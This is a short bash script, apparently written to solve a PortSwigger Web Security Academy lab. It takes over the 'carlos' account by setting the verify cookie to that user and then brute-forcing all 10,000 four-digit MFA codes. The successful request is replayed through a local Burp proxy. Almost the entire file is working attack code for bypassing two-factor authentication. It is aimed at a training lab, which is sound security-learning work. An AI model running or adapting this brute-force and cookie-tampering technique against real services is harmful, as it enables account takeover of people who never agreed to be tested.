#!/bin/bash

# Author: kond3
# Date: 16/07/2024
# Last modified: 16/07/2024 10:31:33

# Description
# Simple script to bruteforce the OTP in Portswigger Lab 08 of Authentication Topic

# Usage
# ./otp_bf.sh <random_part_of_url>


echo ""

if [[ "$1" = "" ]];then
	echo -e "Usage: \t ./otp_bf.sh <random_part_of_url>"
fi

site_url="https://$1.web-security-academy.net"

curl -s -D header.txt "$site_url"/login 1>/dev/null
echo -e "GET request to /login \n\n$(cat header.txt)\n\n"
curl -s -D header.txt -X POST -d "username=wiener&password=peter" "$site_url"/login 1>/dev/null
echo -e "POST request to /login with wiener:peter \n\n$(cat header.txt)\n\n"
cookie=$(cat header.txt | head -n 4 | tail -n 1 | awk '{print $2}')
# echo "$cookie"
curl -s -D header.txt -b "$cookie verify=carlos" "$site_url"/login2 1>/dev/null
echo -e "GET request to /login2 with verify=carlos \n\n$(cat header.txt)\n\n"

otp=""

for payload in {0000..9999};do
	printf 'Payload: %s \r' "$payload"

	curl -s -D header.txt -X POST -b "$cookie verify=carlos" -d "mfa-code=$payload" "$site_url"/login2 1>/dev/null
	head -n 1 header.txt | grep "302" &>/dev/null

	if [ $? -eq 0 ];then
		echo -e "\n\nOPT found: \t $payload"
		otp="$payload"
		echo -e "Successful request \n\n$(cat header.txt)\n\n"
		break
	fi
done

# Send the request to Burp to do show response in browser

curl --proxy http://127.0.0.1:8080 -k -s -X POST -b "$cookie verify=carlos" -d "mfa-code=$otp" "$site_url"/login2 1>/dev/null
echo -e "\nRequest sent to Burp!"

echo ""
exit 0
